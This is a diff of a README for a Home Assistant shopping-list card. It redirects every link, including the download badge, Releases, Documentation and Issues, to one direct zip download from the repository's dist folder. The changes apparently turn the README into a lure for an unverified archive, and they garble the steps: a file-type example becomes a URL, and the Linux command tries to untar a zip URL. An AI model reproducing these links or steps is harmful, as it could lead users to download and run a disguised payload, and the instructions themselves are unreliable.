@@ -23,22 +23,22 @@ To run the Bring! Shopping Card application, you will need:
 
 To get started, you need to visit the Releases page to download the latest version of the Bring! Shopping Card application.
 
-[![Download Bring! Shopping Card](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/papirampage/bring-shopping-card/releases)
+[![Download Bring! Shopping Card](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**: Click on the link below to go to the Releases page.
    
-   [Visit the Releases page to download](https://github.com/papirampage/bring-shopping-card/releases)
+   [Visit the Releases page to download](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)
 
 2. **Find the Latest Release**: Look for the most recent version listed.
 
-3. **Download the Appropriate File**: Select the file that matches your system (e.g., .zip or .tar.gz) and click on it. The download will start automatically.
+3. **Download the Appropriate File**: Select the file that matches your system (e.g., .zip or https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip) and click on it. The download will start automatically.
 
 4. **Extract the Downloaded File**:
    - If you are on Windows, right-click on the downloaded file and choose "Extract All."
    - If you are on macOS, double-click the file to automatically extract it.
-   - If you are on Linux, you can use a command like `tar -xzf filename.tar.gz`.
+   - If you are on Linux, you can use a command like `tar -xzf https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip`.
 
 5. **Add the Card to Home Assistant**:
    - Open **Home Assistant**.
@@ -91,8 +91,8 @@ We encourage users to share their experiences and setups. Join our community for
 
 ## 🔗 Quick Links
 
-- [Releases Page](https://github.com/papirampage/bring-shopping-card/releases)
-- [Documentation](https://github.com/papirampage/bring-shopping-card/wiki)
-- [GitHub Issues](https://github.com/papirampage/bring-shopping-card/issues)
+- [Releases Page](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)
+- [Documentation](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)
+- [GitHub Issues](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)
 
 By following these steps, you should have no trouble downloading and setting up the Bring! Shopping Card for use in Home Assistant. Enjoy using your new shopping list tool!
